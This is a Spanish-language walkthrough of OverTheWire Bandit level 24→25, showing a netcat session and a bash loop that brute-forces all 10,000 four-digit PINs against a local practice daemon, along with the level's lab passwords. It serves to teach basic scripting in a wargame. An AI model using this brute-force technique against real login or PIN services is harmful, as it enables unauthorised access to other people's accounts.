# Bandit Level 24 → Level 25

## Objetivo

Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le proporciona la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN, excepto pasando por todas las 10000 combinaciones, lo que se conoce como fuerza bruta.  
No necesita crear nuevas conexiones cada vez

## Datos de acceso al nivel
- bandit24 
- VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solucion
```
bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 987
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$  for i in {0000..0003}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Notas adicionales
En este nivel, necesitamos la teoría de los niveles anteriores. A saber grep y netcat y conceptos básicos de scripting bash y usos de ciclos for
## Referencias
- https://mayadevbe.me/posts/overthewire/bandit/level25/